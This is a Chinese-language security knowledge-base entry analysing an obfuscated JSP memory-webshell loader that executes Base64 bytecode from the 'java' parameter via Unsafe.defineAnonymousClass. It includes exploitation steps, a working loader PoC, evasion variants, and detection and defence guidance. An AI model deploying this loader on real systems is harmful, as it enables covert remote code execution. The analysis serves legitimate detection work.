---
id: web-java-classloader-unsafe-anonymous-class-jsp-shell
title: JSP 经 Unsafe.defineAnonymousClass 执行请求参数中的匿名类字节码
type: scenario
domain: web
path: web/java/classloader
technique: jsp-unsafe-anonymous-class-loader
aliases:
- Unsafe 内存马
- defineAnonymousClass 马
- 匿名类 JSP 加载器
- 异或混淆 JSP 木马
tags:
- java
- jsp
- webshell
- memory-shell
- unsafe
- classloader
- obfuscation
- tomcat
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V3
  verified_at: '2026-11-04T22:02:17+08:00'
  notes: 已对照原文与图 06 核对：参数名 java、BASE64Decoder→DatatypeConverter 回退、XOR 0x10+appendCodePoint 字符串还原、Unsafe.defineAnonymousClass 以 this.getClass() 为宿主、newInstance 后 equals(pageContext) 触发均与字节码截图一致；原文未提供功能载荷，PoC 为等价最小结构且未执行；1.36KB(1393 字节)与文件属性一致；defineAnonymousClass 依赖 JDK 8 的不确定点已保留。
---

## 一句话结论

一个仅千余字节的 JSP 就能从请求参数 `java` 中取出 Base64 字节码，用 `sun.misc.Unsafe.defineAnonymousClass` 以当前 JSP 类为宿主在内存中定义匿名类，再通过 `newInstance()` 与 `equals(pageContext)` 触发载荷逻辑；木马本体不落盘字节码、每次请求可换功能，且关键字符串全部异或混淆，能规避基于明文特征的静态查杀。

## 原理

- JSP 被容器编译成 Servlet 后，天然持有隐式对象 `pageContext`，并能直接读取 `request.getParameter`，因此可以作为一个“请求驱动的类加载入口”。
- 传统 JSP 内存马依赖自定义 `ClassLoader.defineClass`；本样本改用 `sun.misc.Unsafe.defineAnonymousClass(Class hostClass, byte[] data, Object[] cpPatches)`。匿名类不经过普通类加载器、没有可枚举的类名，也不会在磁盘上留下 `.class` 文件，宿主任意取当前 JSP 类即可。
- 字节码由攻击者在每次请求中动态传入：先用 `sun.misc.BASE64Decoder.decodeBuffer` 解码；该 API 不存在时回退到 `javax.xml.bind.DatatypeConverter.parseBase64Binary`。因此同一 JSP 可以适配不同 JDK。
- 定义完成后执行 `loadedClass.newInstance()`，再调用 `instance.equals(pageContext)`。载荷只需实现 `equals(Object)`，就能在参数传入时执行任意逻辑；这种“传入页面上下文触发 equals”的结构是冰蝎、哥斯拉一类 JSP 内存马的典型特征。
- 样本把所有敏感字符串（`sun.misc.Unsafe`、`theUnsafe`、`defineAnonymousClass`、解码器类名与方法名、参数名等）拆成整数数组，运行时逐字符 `v ^ 0x10` 再 `appendCodePoint` 还原。文件里看不到任何明文危险关键字，静态规则容易漏检。

## 触发条件

- 攻击者已有任意 JSP 文件写入能力（上传、反序列化落地、路径穿越、后台写文件等），且写入的 JSP 能被 Web 访问。
- 目标 JVM 仍提供 `sun.misc.Unsafe.defineAnonymousClass`（JDK 8 环境常见；更高版本是否可用需以实际运行环境验证）。
- JSP 可正常解析执行，Web 目录对应用进程可写。
- 攻击者能向该 JSP 发送请求参数 `java`，并在其中携带合法的 Base64 Java 字节码。
- JSP 文件本身只有约 1.4 KB：加载器与载荷分离，载荷不落盘。

## 利用步骤

1. 编写一个类，其 `equals(Object)` 方法内实现所需功能（命令执行、文件管理、内存马注册等），编译得到 `.class` 字节码。
2. 将字节码 Base64 编码，作为请求参数 `java` 的值发送给 JSP。
3. JSP 读取参数，尝试用 `sun.misc.BASE64Decoder` 解码；失败则用 `javax.xml.bind.DatatypeConverter` 解码。
4. 反射取得 `Unsafe.theUnsafe`，调用 `defineAnonymousClass(this.getClass(), classBytes, null)` 定义匿名类。
5. `newInstance()` 创建实例，调用 `equals(pageContext)` 触发载荷逻辑。
6. 后续每次请求都可替换 `java` 参数中的字节码，JSP 文件本身无需改动；删除 JSP 后已执行过的逻辑是否存活取决于载荷是否另行注册了内存组件。

## PoC

以下为去除异或数组后的等价最小结构；实际样本把每个字符串都写成 `int[]` 后在运行时解码。

```jsp
<%
String payload = request.getParameter("java");
byte[] classBytes;
try {
    Class<?> d = Class.forName("sun.misc.BASE64Decoder");
    classBytes = (byte[]) d.getMethod("decodeBuffer", String.class)
                    .invoke(d.newInstance(), payload);
} catch (Exception e) {
    Class<?> d = Class.forName("javax.xml.bind.DatatypeConverter");
    classBytes = (byte[]) d.getMethod("parseBase64Binary", String.class)
                    .invoke(null, payload);
}

Class<?> uc = Class.forName("sun.misc.Unsafe");
java.lang.reflect.Field f = uc.getDeclaredField("theUnsafe");
f.setAccessible(true);
sun.misc.Unsafe u = (sun.misc.Unsafe) f.get(null);
Class<?> c = (Class<?>) uc.getMethod("defineAnonymousClass",
        Class.class, byte[].class, Object[].class)
        .invoke(u, this.getClass(), classBytes, null);

Object o = c.newInstance();
o.equals(pageContext);   // 载荷的 equals(Object) 即入口
%>
```

说明：字节码内容需自行实现 `equals(Object)`，本文未提供具体功能载荷；`defineAnonymousClass` 与 `newInstance` 的可用性依赖 JVM 版本与实际环境，PoC 未在目标环境执行。

## 变体与关联

- 变体：更换异或密钥、把字符串数组改为其他编码，或把类名/方法名拆成多段拼接，均可改变文件特征。
- 变体：解码器可换成 `java.util.Base64`；在 JDK 8 以下或裁剪运行时中可只用其中一种解码路径。
- 变体：若目标不允许 `Unsafe`，可退回自定义 `ClassLoader.defineClass` 或 TCCL 加载嵌套 jar 的方式。
- 关联：[[web-java-classloader-jsp-memory-servlet-webshell]]（自定义 ClassLoader 注册动态 Servlet 的另一种 JSP 内存马）；[[web-java-classloader-tccl-nested-jar-type-loading]]（类加载器选择对类型解析的影响）。
- 关联：该加载器常作为反序列化/文件上传漏洞的落地载荷；文件大小仅 1–2 KB，修改时间与利用请求时间通常只差数秒。

## 检测与防御

- 检测：全盘检索 Web 目录中的 JSP，重点关注含 `Unsafe`、`theUnsafe`、`defineAnonymousClass`、`getParameter`、`appendCodePoint`、`^ 0x`、大段整数数组的 JSP。
- 检测：JSP 中出现 `newInstance()` 后紧跟 `equals(pageContext)`，或 `Class.forName` 的类名由数字数组还原，都是高置信特征。
- 检测：Web 目录新增 1–2 KB 的小 JSP，且访问时间与异常请求/漏洞利用时间对齐；JSP 文件创建时间与修改时间不一致时，不要直接采信创建时间（时间戳可被篡改）。
- 处置：删除 JSP 后应重启应用或卸载 Context；同时排查是否另有内存 Servlet/Filter/Listener 或计划任务，单删文件不一定清除内存态。
- 防御：不需要 JSP 的业务关闭 JSP 解析；Web 目录最小写权限；封堵上传/反序列化入口；RASP 或 EDR 监控 `defineAnonymousClass`、`defineClass` 与动态类定义；集中留存访问日志。
